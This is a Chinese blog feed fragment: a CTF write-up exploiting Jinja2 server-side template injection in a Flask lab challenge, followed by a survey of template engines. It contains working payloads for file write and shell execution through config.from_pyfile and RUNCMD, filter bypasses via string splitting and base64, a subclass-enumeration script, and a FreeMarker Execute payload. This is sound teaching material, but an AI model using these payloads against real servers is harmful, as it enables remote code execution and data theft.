<h2 id="web——fuzz"><a href="#web——fuzz" class="headerlink" title="web——fuzz"></a>web——fuzz</h2><p><img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20210226194440.png" alt="img" style="zoom:67%;"><img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20210226202248.png" alt="img"><br>检查完后台 有一个robots.txt文件<br><img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20210226202703.png" alt="img" style="zoom:67%;"><br>查看源码：，有一串经过base64编码过的内容，将其解码看：</p>
<p>burpsuit抓包都没拿到有用信息？可能是我太菜了吧，于是去看wp：<br>他是让我们fuzz parameter就是传参的参数名，一开始我尝试了几个，因为没有字典可以爆破就放弃了，没想到还真是要这么猜，当传入?name的时候网页的回显发生了变化：</p>
<p><img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20210226194440.png" alt="img" style="zoom:67%;"><img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20210226202248.png" alt="img"></p>
<p>看到那只大蟒蛇，又看到这个界面——python ssti注入<br>尝试payload:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?name&#x3D;&#123;&#123;10*10&#125;&#125;</span><br></pre></td></tr></table></figure>

<p>页面返回excuse，好像有什么被过滤了，再尝试10-10，页面回显hello 0，确定过滤*号，接下来使用：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#123;&#123;&quot;&quot;.__class__.__mro__[1]&#125;&#125;</span><br></pre></td></tr></table></figure>

<p>页面回显的不是object类，于是更换参数：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#123;&#123;&quot;&quot;.__class__.__mro__[2]&#125;&#125;</span><br></pre></td></tr></table></figure>

<p><img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20210228193057.png" alt="img"></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">&#123;&#123;<span class="string">&quot;&quot;</span>.__class__.__mro__[<span class="number">2</span>].__subclasses__()&#125;&#125;<span class="comment">#显示所有子类</span></span><br></pre></td></tr></table></figure>



<figure class="highlight"><table><tr><td class="code"><pre><span class="line">[&lt;type &#x27;type&#x27;&gt;, &lt;type &#x27;weakref&#x27;&gt;, &lt;type &#x27;weakcallableproxy&#x27;&gt;, &lt;type &#x27;weakproxy&#x27;&gt;, &lt;type &#x27;int&#x27;&gt;, &lt;type &#x27;basestring&#x27;&gt;, &lt;type &#x27;bytearray&#x27;&gt;, &lt;type &#x27;list&#x27;&gt;, &lt;type &#x27;NoneType&#x27;&gt;, &lt;type &#x27;NotImplementedType&#x27;&gt;, &lt;type &#x27;traceback&#x27;&gt;, &lt;type &#x27;super&#x27;&gt;, &lt;type &#x27;xrange&#x27;&gt;, &lt;type &#x27;dict&#x27;&gt;, &lt;type &#x27;set&#x27;&gt;, &lt;type &#x27;slice&#x27;&gt;, &lt;type &#x27;staticmethod&#x27;&gt;, &lt;type &#x27;complex&#x27;&gt;, &lt;type &#x27;float&#x27;&gt;, &lt;type &#x27;buffer&#x27;&gt;, &lt;type &#x27;long&#x27;&gt;, &lt;type &#x27;frozenset&#x27;&gt;, &lt;type &#x27;property&#x27;&gt;, &lt;type &#x27;memoryview&#x27;&gt;, &lt;type &#x27;tuple&#x27;&gt;, &lt;type &#x27;enumerate&#x27;&gt;, &lt;type &#x27;reversed&#x27;&gt;, &lt;type &#x27;code&#x27;&gt;, &lt;type &#x27;frame&#x27;&gt;, &lt;type &#x27;builtin_function_or_method&#x27;&gt;, &lt;type &#x27;instancemethod&#x27;&gt;, &lt;type &#x27;function&#x27;&gt;, &lt;type &#x27;classobj&#x27;&gt;, &lt;type &#x27;dictproxy&#x27;&gt;, &lt;type &#x27;generator&#x27;&gt;, &lt;type &#x27;getset_descriptor&#x27;&gt;, &lt;type &#x27;wrapper_descriptor&#x27;&gt;, &lt;type &#x27;instance&#x27;&gt;, &lt;type &#x27;ellipsis&#x27;&gt;, &lt;type &#x27;member_descriptor&#x27;&gt;, &lt;type &#x27;file&#x27;&gt;, &lt;type &#x27;PyCapsule&#x27;&gt;, &lt;type &#x27;cell&#x27;&gt;, &lt;type &#x27;callable-iterator&#x27;&gt;, &lt;type &#x27;iterator&#x27;&gt;, &lt;type &#x27;sys.long_info&#x27;&gt;, &lt;type &#x27;sys.float_info&#x27;&gt;, &lt;type &#x27;EncodingMap&#x27;&gt;, &lt;type &#x27;fieldnameiterator&#x27;&gt;, &lt;type &#x27;formatteriterator&#x27;&gt;, &lt;type &#x27;sys.version_info&#x27;&gt;, &lt;type &#x27;sys.flags&#x27;&gt;, &lt;type &#x27;exceptions.BaseException&#x27;&gt;, &lt;type &#x27;module&#x27;&gt;, &lt;type &#x27;imp.NullImporter&#x27;&gt;, &lt;type &#x27;zipimport.zipimporter&#x27;&gt;, &lt;type &#x27;posix.stat_result&#x27;&gt;, &lt;type &#x27;posix.statvfs_result&#x27;&gt;, &lt;class &#x27;warnings.WarningMessage&#x27;&gt;, &lt;class &#x27;warnings.catch_warnings&#x27;&gt;, &lt;class &#x27;_weakrefset._IterationGuard&#x27;&gt;, &lt;class &#x27;_weakrefset.WeakSet&#x27;&gt;, &lt;class &#x27;_abcoll.Hashable&#x27;&gt;, &lt;type &#x27;classmethod&#x27;&gt;, &lt;class &#x27;_abcoll.Iterable&#x27;&gt;, &lt;class &#x27;_abcoll.Sized&#x27;&gt;, &lt;class &#x27;_abcoll.Container&#x27;&gt;, &lt;class &#x27;_abcoll.Callable&#x27;&gt;, &lt;class &#x27;site._Printer&#x27;&gt;, &lt;class &#x27;site._Helper&#x27;&gt;, &lt;type &#x27;_sre.SRE_Pattern&#x27;&gt;, &lt;type &#x27;_sre.SRE_Match&#x27;&gt;, &lt;type &#x27;_sre.SRE_Scanner&#x27;&gt;, &lt;class &#x27;site.Quitter&#x27;&gt;, &lt;class &#x27;codecs.IncrementalEncoder&#x27;&gt;, &lt;class &#x27;codecs.IncrementalDecoder&#x27;&gt;, &lt;type &#x27;operator.itemgetter&#x27;&gt;, &lt;type &#x27;operator.attrgetter&#x27;&gt;, &lt;type &#x27;operator.methodcaller&#x27;&gt;, &lt;type &#x27;functools.partial&#x27;&gt;, &lt;type &#x27;itertools.combinations&#x27;&gt;, &lt;type &#x27;itertools.combinations_with_replacement&#x27;&gt;, &lt;type &#x27;itertools.cycle&#x27;&gt;, &lt;type &#x27;itertools.dropwhile&#x27;&gt;, &lt;type &#x27;itertools.takewhile&#x27;&gt;, &lt;type &#x27;itertools.islice&#x27;&gt;, &lt;type &#x27;itertools.starmap&#x27;&gt;, &lt;type &#x27;itertools.imap&#x27;&gt;, &lt;type &#x27;itertools.chain&#x27;&gt;, &lt;type &#x27;itertools.compress&#x27;&gt;, &lt;type &#x27;itertools.ifilter&#x27;&gt;, &lt;type &#x27;itertools.ifilterfalse&#x27;&gt;, &lt;type &#x27;itertools.count&#x27;&gt;, &lt;type &#x27;itertools.izip&#x27;&gt;, &lt;type &#x27;itertools.izip_longest&#x27;&gt;, &lt;type &#x27;itertools.permutations&#x27;&gt;, &lt;type &#x27;itertools.product&#x27;&gt;, &lt;type &#x27;itertools.repeat&#x27;&gt;, &lt;type &#x27;itertools.groupby&#x27;&gt;, &lt;type &#x27;itertools.tee_dataobject&#x27;&gt;, &lt;type &#x27;itertools.tee&#x27;&gt;, &lt;type &#x27;itertools._grouper&#x27;&gt;, &lt;type &#x27;cStringIO.StringO&#x27;&gt;, &lt;type &#x27;cStringIO.StringI&#x27;&gt;, &lt;class &#x27;string.Template&#x27;&gt;, &lt;class &#x27;string.Formatter&#x27;&gt;, &lt;type &#x27;collections.deque&#x27;&gt;, &lt;type &#x27;deque_iterator&#x27;&gt;, &lt;type &#x27;deque_reverse_iterator&#x27;&gt;, &lt;type &#x27;_thread._localdummy&#x27;&gt;, &lt;type &#x27;thread._local&#x27;&gt;, &lt;type &#x27;thread.lock&#x27;&gt;, &lt;type &#x27;datetime.date&#x27;&gt;, &lt;type &#x27;datetime.timedelta&#x27;&gt;, &lt;type &#x27;datetime.time&#x27;&gt;, &lt;type &#x27;datetime.tzinfo&#x27;&gt;, &lt;class &#x27;werkzeug._internal._Missing&#x27;&gt;, &lt;class &#x27;werkzeug._internal._DictAccessorProperty&#x27;&gt;, &lt;type &#x27;time.struct_time&#x27;&gt;, &lt;class &#x27;email.LazyImporter&#x27;&gt;, &lt;type &#x27;Struct&#x27;&gt;, &lt;type &#x27;_hashlib.HASH&#x27;&gt;, &lt;type &#x27;_random.Random&#x27;&gt;, &lt;class &#x27;socket._closedsocket&#x27;&gt;, &lt;type &#x27;_socket.socket&#x27;&gt;, &lt;type &#x27;method_descriptor&#x27;&gt;, &lt;class &#x27;socket._socketobject&#x27;&gt;, &lt;class &#x27;socket._fileobject&#x27;&gt;, &lt;class &#x27;urlparse.ResultMixin&#x27;&gt;, &lt;class &#x27;calendar.Calendar&#x27;&gt;, &lt;type &#x27;_io._IOBase&#x27;&gt;, &lt;type &#x27;_io.IncrementalNewlineDecoder&#x27;&gt;, &lt;class &#x27;werkzeug.datastructures.ImmutableListMixin&#x27;&gt;, &lt;class &#x27;werkzeug.datastructures.ImmutableDictMixin&#x27;&gt;, &lt;class &#x27;werkzeug.datastructures.UpdateDictMixin&#x27;&gt;, &lt;class &#x27;werkzeug.datastructures._omd_bucket&#x27;&gt;, &lt;class &#x27;werkzeug.datastructures.Headers&#x27;&gt;, &lt;class &#x27;werkzeug.datastructures.ImmutableHeadersMixin&#x27;&gt;, &lt;class &#x27;werkzeug.datastructures.HeaderSet&#x27;&gt;, &lt;class &#x27;werkzeug.datastructures.ETags&#x27;&gt;, &lt;class &#x27;werkzeug.datastructures.IfRange&#x27;&gt;, &lt;class &#x27;werkzeug.datastructures.Range&#x27;&gt;, &lt;class &#x27;werkzeug.datastructures.ContentRange&#x27;&gt;, &lt;class &#x27;werkzeug.datastructures.FileStorage&#x27;&gt;, &lt;class &#x27;werkzeug.urls.Href&#x27;&gt;, &lt;class &#x27;werkzeug.wsgi.SharedDataMiddleware&#x27;&gt;, &lt;class &#x27;werkzeug.wsgi.DispatcherMiddleware&#x27;&gt;, &lt;class &#x27;werkzeug.wsgi.ClosingIterator&#x27;&gt;, &lt;class &#x27;werkzeug.wsgi.FileWrapper&#x27;&gt;, &lt;class &#x27;werkzeug.wsgi.LimitedStream&#x27;&gt;, &lt;class &#x27;werkzeug.formparser.FormDataParser&#x27;&gt;, &lt;class &#x27;werkzeug.formparser.MultiPartParser&#x27;&gt;, &lt;class &#x27;werkzeug.utils.HTMLBuilder&#x27;&gt;, &lt;class &#x27;werkzeug.wrappers.BaseRequest&#x27;&gt;, &lt;class &#x27;werkzeug.wrappers.BaseResponse&#x27;&gt;, &lt;class &#x27;werkzeug.wrappers.AcceptMixin&#x27;&gt;, &lt;class &#x27;werkzeug.wrappers.ETagRequestMixin&#x27;&gt;, &lt;class &#x27;werkzeug.wrappers.UserAgentMixin&#x27;&gt;, &lt;class &#x27;werkzeug.wrappers.AuthorizationMixin&#x27;&gt;, &lt;class &#x27;werkzeug.wrappers.StreamOnlyMixin&#x27;&gt;, &lt;class &#x27;werkzeug.wrappers.ETagResponseMixin&#x27;&gt;, &lt;class &#x27;werkzeug.wrappers.ResponseStream&#x27;&gt;, &lt;class &#x27;werkzeug.wrappers.ResponseStreamMixin&#x27;&gt;, &lt;class &#x27;werkzeug.wrappers.CommonRequestDescriptorsMixin&#x27;&gt;, &lt;class &#x27;werkzeug.wrappers.CommonResponseDescriptorsMixin&#x27;&gt;, &lt;class &#x27;werkzeug.wrappers.WWWAuthenticateMixin&#x27;&gt;, &lt;class &#x27;werkzeug.exceptions.Aborter&#x27;&gt;, &lt;class &#x27;threading._Verbose&#x27;&gt;, &lt;type &#x27;cPickle.Unpickler&#x27;&gt;, &lt;type &#x27;cPickle.Pickler&#x27;&gt;, &lt;class &#x27;jinja2.utils.MissingType&#x27;&gt;, &lt;class &#x27;jinja2.utils.LRUCache&#x27;&gt;, &lt;class &#x27;jinja2.utils.Cycler&#x27;&gt;, &lt;class &#x27;jinja2.utils.Joiner&#x27;&gt;, &lt;class &#x27;markupsafe._MarkupEscapeHelper&#x27;&gt;, &lt;class &#x27;jinja2.nodes.EvalContext&#x27;&gt;, &lt;class &#x27;jinja2.runtime.TemplateReference&#x27;&gt;, &lt;class &#x27;jinja2.nodes.Node&#x27;&gt;, &lt;class &#x27;jinja2.runtime.Context&#x27;&gt;, &lt;class &#x27;jinja2.runtime.BlockReference&#x27;&gt;, &lt;class &#x27;jinja2.runtime.LoopContext&#x27;&gt;, &lt;class &#x27;jinja2.runtime.LoopContextIterator&#x27;&gt;, &lt;class &#x27;jinja2.runtime.Macro&#x27;&gt;, &lt;class &#x27;jinja2.runtime.Undefined&#x27;&gt;, &lt;class &#x27;numbers.Number&#x27;&gt;, &lt;class &#x27;decimal.Decimal&#x27;&gt;, &lt;class &#x27;decimal._ContextManager&#x27;&gt;, &lt;class &#x27;decimal.Context&#x27;&gt;, &lt;class &#x27;decimal._WorkRep&#x27;&gt;, &lt;class &#x27;decimal._Log10Memoize&#x27;&gt;, &lt;type &#x27;_ast.AST&#x27;&gt;, &lt;class &#x27;jinja2.lexer.Failure&#x27;&gt;, &lt;class &#x27;jinja2.lexer.TokenStreamIterator&#x27;&gt;, &lt;class &#x27;jinja2.lexer.TokenStream&#x27;&gt;, &lt;class &#x27;jinja2.lexer.Lexer&#x27;&gt;, &lt;class &#x27;jinja2.parser.Parser&#x27;&gt;, &lt;class &#x27;jinja2.visitor.NodeVisitor&#x27;&gt;, &lt;class &#x27;jinja2.compiler.Identifiers&#x27;&gt;, &lt;class &#x27;jinja2.compiler.Frame&#x27;&gt;, &lt;class &#x27;jinja2.environment.Environment&#x27;&gt;, &lt;class &#x27;jinja2.environment.Template&#x27;&gt;, &lt;class &#x27;jinja2.environment.TemplateModule&#x27;&gt;, &lt;class &#x27;jinja2.environment.TemplateExpression&#x27;&gt;, &lt;class &#x27;jinja2.environment.TemplateStream&#x27;&gt;, &lt;class &#x27;jinja2.loaders.BaseLoader&#x27;&gt;, &lt;class &#x27;jinja2.bccache.Bucket&#x27;&gt;, &lt;class &#x27;jinja2.bccache.BytecodeCache&#x27;&gt;, &lt;class &#x27;difflib.HtmlDiff&#x27;&gt;, &lt;class &#x27;uuid.UUID&#x27;&gt;, &lt;type &#x27;CArgObject&#x27;&gt;, &lt;type &#x27;_ctypes.CThunkObject&#x27;&gt;, &lt;type &#x27;_ctypes._CData&#x27;&gt;, &lt;type &#x27;_ctypes.CField&#x27;&gt;, &lt;type &#x27;_ctypes.DictRemover&#x27;&gt;, &lt;class &#x27;ctypes.CDLL&#x27;&gt;, &lt;class &#x27;ctypes.LibraryLoader&#x27;&gt;, &lt;class &#x27;werkzeug.routing.RuleFactory&#x27;&gt;, &lt;class &#x27;werkzeug.routing.RuleTemplate&#x27;&gt;, &lt;class &#x27;werkzeug.routing.BaseConverter&#x27;&gt;, &lt;class &#x27;werkzeug.routing.Map&#x27;&gt;, &lt;class &#x27;werkzeug.routing.MapAdapter&#x27;&gt;, &lt;class &#x27;flask.signals.Namespace&#x27;&gt;, &lt;class &#x27;flask.signals._FakeSignal&#x27;&gt;, &lt;class &#x27;werkzeug.local.Local&#x27;&gt;, &lt;class &#x27;werkzeug.local.LocalStack&#x27;&gt;, &lt;class &#x27;werkzeug.local.LocalManager&#x27;&gt;, &lt;class &#x27;werkzeug.local.LocalProxy&#x27;&gt;, &lt;class &#x27;flask.helpers.locked_cached_property&#x27;&gt;, &lt;class &#x27;flask.helpers._PackageBoundObject&#x27;&gt;, &lt;type &#x27;_json.Scanner&#x27;&gt;, &lt;type &#x27;_json.Encoder&#x27;&gt;, &lt;class &#x27;json.decoder.JSONDecoder&#x27;&gt;, &lt;class &#x27;json.encoder.JSONEncoder&#x27;&gt;, &lt;class &#x27;itsdangerous._CompactJSON&#x27;&gt;, &lt;class &#x27;itsdangerous.SigningAlgorithm&#x27;&gt;, &lt;class &#x27;itsdangerous.Signer&#x27;&gt;, &lt;class &#x27;itsdangerous.Serializer&#x27;&gt;, &lt;class &#x27;itsdangerous.URLSafeSerializerMixin&#x27;&gt;, &lt;class &#x27;contextlib.GeneratorContextManager&#x27;&gt;, &lt;class &#x27;contextlib.closing&#x27;&gt;, &lt;class &#x27;click._compat._FixupStream&#x27;&gt;, &lt;class &#x27;click._compat._AtomicFile&#x27;&gt;, &lt;class &#x27;click.utils.LazyFile&#x27;&gt;, &lt;class &#x27;click.utils.KeepOpenFile&#x27;&gt;, &lt;class &#x27;click.types.ParamType&#x27;&gt;, &lt;class &#x27;click.parser.Option&#x27;&gt;, &lt;class &#x27;click.parser.Argument&#x27;&gt;, &lt;class &#x27;click.parser.ParsingState&#x27;&gt;, &lt;class &#x27;click.parser.OptionParser&#x27;&gt;, &lt;class &#x27;click.formatting.HelpFormatter&#x27;&gt;, &lt;class &#x27;click.core.Context&#x27;&gt;, &lt;class &#x27;click.core.BaseCommand&#x27;&gt;, &lt;class &#x27;click.core.Parameter&#x27;&gt;, &lt;class &#x27;flask.cli.DispatchingApp&#x27;&gt;, &lt;class &#x27;flask.cli.ScriptInfo&#x27;&gt;, &lt;class &#x27;flask.config.ConfigAttribute&#x27;&gt;, &lt;class &#x27;flask.ctx._AppCtxGlobals&#x27;&gt;, &lt;class &#x27;flask.ctx.AppContext&#x27;&gt;, &lt;class &#x27;flask.ctx.RequestContext&#x27;&gt;, &lt;class &#x27;flask.sessions.SessionMixin&#x27;&gt;, &lt;class &#x27;flask.sessions.TaggedJSONSerializer&#x27;&gt;, &lt;class &#x27;flask.sessions.SessionInterface&#x27;&gt;, &lt;class &#x27;flask.blueprints.BlueprintSetupState&#x27;&gt;, &lt;type &#x27;select.epoll&#x27;&gt;, &lt;class &#x27;werkzeug.serving.WSGIRequestHandler&#x27;&gt;, &lt;class &#x27;werkzeug.serving._SSLContext&#x27;&gt;, &lt;class &#x27;werkzeug.serving.BaseWSGIServer&#x27;&gt;, &lt;class &#x27;logging.LogRecord&#x27;&gt;, &lt;class &#x27;logging.Formatter&#x27;&gt;, &lt;class &#x27;logging.BufferingFormatter&#x27;&gt;, &lt;class &#x27;logging.Filter&#x27;&gt;, &lt;class &#x27;logging.Filterer&#x27;&gt;, &lt;class &#x27;logging.PlaceHolder&#x27;&gt;, &lt;class &#x27;logging.Manager&#x27;&gt;, &lt;class &#x27;logging.LoggerAdapter&#x27;&gt;, &lt;class &#x27;jinja2.debug.TracebackFrameProxy&#x27;&gt;, &lt;class &#x27;jinja2.ext.Extension&#x27;&gt;, &lt;class &#x27;jinja2.ext._CommentFinder&#x27;&gt;, &lt;class &#x27;jinja2.debug.ProcessedTraceback&#x27;&gt;]</span><br></pre></td></tr></table></figure>


<p>找了很久都没找到可以自动写编号以及查找结果的脚本，可能是我搜索姿势不对，于是自己写了一个臭烂代码：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">s=requests.session()</span><br><span class="line">url=<span class="string">&quot;http://4282889f587b4157a422f0850b772d399e6c949b99b34289.changame.ichunqiu.com/?name=&quot;</span></span><br><span class="line">choice=[]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>,<span class="number">301</span>):</span><br><span class="line">    payload=<span class="string">f&quot;&#123;&#123;&#123;&#123;&#x27;&#x27;.__class__.__mro__[2].__subclasses__()[<span class="subst">&#123;i&#125;</span>]&#125;&#125;&#125;&#125;&quot;</span></span><br><span class="line">    reponse=(s.get(url+payload).text)</span><br><span class="line">    print(i,reponse)</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&quot;file&quot;</span> <span class="keyword">in</span> reponse:</span><br><span class="line">        pass_reponse = [i, reponse]</span><br><span class="line">        choice.append(pass_reponse)</span><br><span class="line">print(choice)</span><br></pre></td></tr></table></figure>

<p>最后只看到一个40 &lt;type&gt; flie<br><img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20210301012231.png" alt="img" style="zoom:67%;"></p>
<p>于是构建payload:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#123;&#123;&quot;&quot;.__class__.__mro__[2].__subclasses__()[40]&#125;&#125;</span><br></pre></td></tr></table></figure>

<p>file对象方法参考：<a href="https://www.runoob.com/python/file-methods.html">https://www.runoob.com/python/file-methods.html</a></p>
<p>我们现在可以使用要么就是读要么就是写，除此之外没有其他办法，找了好久，还是看wp吧。。。。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">&#123;&#123; <span class="string">&#x27;&#x27;</span>.__class__.__mro__[<span class="number">2</span>].__subclasses__()[<span class="number">40</span>](<span class="string">&#x27;/tmp/owned.cfg&#x27;</span>, <span class="string">&#x27;w&#x27;</span>).write(<span class="string">&#x27;from subprocess import check_output\n\nRUNCMD = check_output\n&#x27;</span>) &#125;&#125; </span><br></pre></td></tr></table></figure>

<p>解析一下上面这个payload，使用的是write的命令，并且是w，意思是将后面的内容写入/tmp/owned.cfg这个当中，没有则创建新文件。写入的内容是：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> subprocess <span class="keyword">import</span> check_output</span><br><span class="line">RUNCMD=check_output</span><br><span class="line"><span class="comment">#执行外部命令并获取他的输出</span></span><br></pre></td></tr></table></figure>

<p>接下来输入:</p>
<figure class="highlight"><table><tr><td class="code"><pre><span class="line">?name=&#123;&#123; config.from_pyfile(&#x27;/tmp/owned.cfg&#x27;) &#125;&#125;</span><br></pre></td></tr></table></figure>

<p>Flask 被设计为需要配置来启动应用。放置配置的地方即为这个config，如果是要添加文件中的内容则为以上格式</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">&#123;&#123; config[<span class="string">&#x27;RUNCMD&#x27;</span>](<span class="string">&#x27;/usr/bin/id&#x27;</span>,shell=<span class="literal">True</span>) &#125;&#125;</span><br></pre></td></tr></table></figure>

<p>此时就可以执行指令了 ‘ ‘内为放置指令的地方，shell=true的意思是让shell本身的管道对于受信任的输入仍然支持<br>此时该命令可改写为：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">RUNCMD = os.system(<span class="string">&quot;/usr/bin/id&quot;</span>)<span class="comment">#相当于是间接调用了os模块执行系统命令</span></span><br></pre></td></tr></table></figure>

<p>参考:<a href="https://docs.python.org/zh-cn/3/library/subprocess.html#replacing-bin-sh-shell-command-substitution">https://docs.python.org/zh-cn/3/library/subprocess.html#replacing-bin-sh-shell-command-substitution</a><br>接下来就是寻找flag并执行即可：</p>
<figure class="highlight"><table><tr><td class="code"><pre><span class="line">?name=&#123;&#123; config[&#x27;RUNCMD&#x27;](&#x27;`echo ` l&#x27;+&#x27;s /var/www/html/&#x27;,shell=True) &#125;&#125;</span><br></pre></td></tr></table></figure>

<p>这里有两个点，第一个是由于ls被过滤，所以可以采用这中**’’+’’<strong>的拼接方式进行绕过，然后</strong>``两个反引号的作用是引用系统命令**<br>我看其他payload 也可以采取使用base64编码再解码的形式进行绕过：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#123;&#123; config[&#39;RUNCMD&#39;](&#39;&#96;echo bHMgLWFsIC92YXIvd3d3L2h0bWwK | base64 -d&#96;&#39;,shell&#x3D;True) &#125;&#125;</span><br></pre></td></tr></table></figure>

<img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20210301131306.png" alt="img" style="zoom:67%;">
找到flag的位置，cat一下

<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">&#123;&#123; config[<span class="string">&#x27;RUNCMD&#x27;</span>](<span class="string">&#x27;`echo`cat /var/www/html/fl&#x27;</span>+<span class="string">&#x27;4g&#x27;</span>,shell=<span class="literal">True</span>) &#125;&#125;</span><br></pre></td></tr></table></figure>

<p>这里再提供一种拿到flag的方法，其实在前面也已经提过了：<br>file类中有read方法：<br>所以这里其实也可以写成：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#123;&#123;&quot;&quot;.__class__.__mro__[2].__subclasses__()[40](&#39;&#x2F;var&#x2F;www&#x2F;html&#x2F;fl&#39;+&#39;4g&#39;).read()&#125;&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Hello flag&#123;f0551e10-7ebe-45a0-be51-0d103fc0400b&#125; </span><br></pre></td></tr></table></figure>



]]></content>
  </entry>
  <entry>
    <title>ssti注入续()</title>
    <url>/2021/04/01/ssti%E6%B3%A8%E5%85%A5%E7%BB%AD/</url>
    <content><![CDATA[<h1 id="前言："><a href="#前言：" class="headerlink" title="前言："></a>前言：</h1><p>之前理解的ssti注入一直以为是python才有的，后来发现并不是的，应该说是服务器端模板注入，<strong>凡是使用模板的地方都有可能出现ssti注入</strong>！！<a id="more"></a></p>
<h2 id="模板注入攻击步骤"><a href="#模板注入攻击步骤" class="headerlink" title="模板注入攻击步骤"></a>模板注入攻击步骤</h2><p>确定模板类型——&gt;选择对应攻击语句</p>
<h1 id="常见模板引擎"><a href="#常见模板引擎" class="headerlink" title="常见模板引擎"></a>常见模板引擎</h1><h3 id="1-php-常用的"><a href="#1-php-常用的" class="headerlink" title="1.php 常用的"></a><strong>1.php 常用的</strong></h3><p><strong>Smarty</strong></p>
<p>Smarty算是一种很老的PHP模板引擎了，非常的经典，使用的比较广泛</p>
<p><strong>Twig</strong></p>
<p>Twig是来自于Symfony的模板引擎，它非常易于安装和使用。它的操作有点像Mustache和liquid。</p>
<p><strong>Blade</strong></p>
<p>Blade 是 Laravel 提供的一个既简单又强大的模板引擎。</p>
<p>和其他流行的 PHP 模板引擎不一样，Blade 并不限制你在视图中使用原生 PHP 代码。所有 Blade 视图文件都将被编译成原生的 PHP 代码并缓存起来，除非它被修改，否则不会重新编译，这就意味着 Blade 基本上不会给你的应用增加任何额外负担。</p>
<h3 id="2-Java-常用的"><a href="#2-Java-常用的" class="headerlink" title="2.Java 常用的"></a><strong>2.Java 常用的</strong></h3><p><strong>JSP</strong></p>
<p>这个引擎我想应该没人不知道吧，这个应该也是我最初学习的一个模板引擎，非常的经典</p>
<p><strong>FreeMarker</strong></p>
<p>FreeMarker是一款模板引擎： 即一种基于模板和要改变的数据， 并用来生成输出文本（HTML网页、电子邮件、配置文件、源代码等）的通用工具。 它不是面向最终用户的，而是一个Java类库，是一款程序员可以嵌入他们所开发产品的组件。</p>
<p><strong>Velocity</strong></p>
<p>Velocity作为历史悠久的模板引擎不单单可以替代JSP作为Java Web的服务端网页模板引擎，而且可以作为普通文本的模板引擎来增强服务端程序文本处理能力。</p>
<h3 id="3-Python-常用的"><a href="#3-Python-常用的" class="headerlink" title="3.Python 常用的"></a><strong>3.Python 常用的</strong></h3><p><strong>Jinja2</strong></p>
<p>flask jinja2 一直是一起说的，使用非常的广泛，是我学习的第一个模板引擎</p>
<p><strong>django</strong></p>
<p>django 应该使用的是专属于自己的一个模板引擎，我这里姑且就叫他 django，我们都知道 django 以快速开发著称，有自己好用的ORM，他的很多东西都是耦合性非常高的，你使用别的就不能发挥出 django 的特性了</p>
<p><strong>tornado</strong></p>
<p>tornado 也有属于自己的一套模板引擎，tornado 强调的是异步非阻塞高并发</p>
<h3 id="4-注意："><a href="#4-注意：" class="headerlink" title="4.注意："></a><strong>4.注意：</strong></h3><p>同一种语言不同的模板引擎支持的语法虽然很像，但是还是有略微的差异的，比如</p>
<p>tornado render() 中支持传入自定义函数，以及函数的参数，然后在两个大括号</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#123;&#123;&#125;&#125;</span><br></pre></td></tr></table></figure>

<p>中执行,但是 django 的模板引擎相对于tornado 来说就相对难用一些</p>
<h2 id="php实例"><a href="#php实例" class="headerlink" title="php实例:"></a>php实例:</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">require_once</span> dirname(<span class="keyword">__FILE__</span>).‘/../lib/Twig/Autoloader.php‘;</span><br><span class="line">Twig_Autoloader::register(<span class="literal">true</span>);</span><br><span class="line"></span><br><span class="line">$twig = <span class="keyword">new</span> Twig_Environment(<span class="keyword">new</span> Twig_Loader_String());</span><br><span class="line">$output = $twig-&gt;render(<span class="string">&quot;Hello <span class="subst">&#123;$_GET[‘name‘]&#125;</span>&quot;</span>);  <span class="comment">// 将用户输入作为模版内容的一部分</span></span><br><span class="line"><span class="keyword">echo</span> $output;</span><br></pre></td></tr></table></figure>

<h2 id="python实例"><a href="#python实例" class="headerlink" title="python实例"></a>python实例</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">@app.errorhandler(404)</span><br><span class="line">def page_not_found(e):</span><br><span class="line">    template &#x3D; &#39;&#39;&#39;&#123;%% extends &quot;layout.html&quot; %%&#125;</span><br><span class="line">&#123;%% block body %%&#125;</span><br><span class="line">    &lt;div class&#x3D;&quot;center-content error&quot;&gt;</span><br><span class="line">        &lt;h1&gt;Oops! That page doesn&#39;t exist.&lt;&#x2F;h1&gt;</span><br><span class="line">        &lt;h3&gt;%s&lt;&#x2F;h3&gt;</span><br><span class="line">    &lt;&#x2F;div&gt;</span><br><span class="line">&#123;%% endblock %%&#125;</span><br><span class="line">&#39;&#39;&#39; % (request.url)</span><br><span class="line">    return render_template_string(template), 404</span><br></pre></td></tr></table></figure>

<h2 id="java实例"><a href="#java实例" class="headerlink" title="java实例"></a>java实例</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;#assign ex&#x3D;&quot;freemarker.template.utility.Execute&quot;?new()&gt; </span><br><span class="line">$&#123; ex(&quot;id&quot;) &#125;</span><br></pre></td></tr></table></figure>

